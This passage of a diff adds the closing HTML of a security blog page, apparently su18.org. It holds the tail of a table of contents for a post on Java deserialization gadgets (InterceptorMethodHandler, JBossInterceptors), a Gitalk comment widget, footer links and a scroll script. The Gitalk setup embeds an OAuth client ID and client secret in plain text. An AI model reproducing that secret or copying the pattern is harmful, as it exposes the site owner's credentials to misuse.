+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-3">前置知识</a>
+<ul>
+<li><a href="#interceptormethodhandler">InterceptorMethodHandler</a></li>
+</ul>
+</li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%9E%84%E9%80%A0-3">攻击构造</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93-3">总结</a></li>
+</ul>
+</li>
+<li><a href="#jbossinterceptors">JBossInterceptors</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '21ee097e0f08e9b76b4b',
+    clientSecret: 'bda6c4a0d4dc3f275da2e82d2d59b683274ff195',
+    repo: 'blogtalk',
+    owner: 'su18',
+    admin: ['su18'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  友情链接：<a href="https://www.yzmm.net/" target="_blank">园长</a> <a href="https://www.cnblogs.com/H4ck3R-XiX/" target="_blank">赵公子</a> <a href="https://fynch3r.github.io" target="_blank">fynch3r</a> <a href="https://g1asssy.com/" target="_blank">Glassy@Amadeus</a> <a href="https://iswin.org/" target="_blank">随风</a>  <a href="https://www.9170.org/" target="_blank">健宇</a>  <a href="https://fuzz7j.github.io/" target="_blank">fuzz7j</a>  <a href="https://blog.zgsec.cn/" target="_blank">曾哥</a> | 
+  <a class="rss" href="https://su18.org/atom.xml" target="_blank">RSS</a>
+</div>
+
+<script>
+  hljs.initHighlightingOnLoad()
+
+  let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+  // This should probably be throttled.
+  // Especially because it triggers during smooth scrolling.
+  // https://lodash.com/docs/4.17.10#throttle
+  // You could do like...
+  // window.addEventListener("scroll", () => {
+  //    _.throttle(doThatStuff, 100);
+  // });
+  // Only not doing it here to keep this Pen dependency-free.
+
+  window.addEventListener("scroll", event => {
+    let fromTop = window.scrollY;
+
+    mainNavLinks.forEach((link, index) => {
+      let section = document.getElementById(decodeURI(link.hash).substring(1));
+      let nextSection = null
+      if (mainNavLinks[index + 1]) {
+        nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+      }
+      console.log('section.offsetHeight', section.offsetHeight);
+      if (section.offsetTop <= fromTop) {
+        if (nextSection) {
+          if (nextSection.offsetTop > fromTop) {
+            link.classList.add("current");
+          } else {
+            link.classList.remove("current");    
+          }
+        } else {
+          link.classList.add("current");
+        }
+      } else {
+        link.classList.remove("current");
+      }
+    });
+  });
+
+</script>
+
+      </div>
+    </div>
+  </body>
+</html>
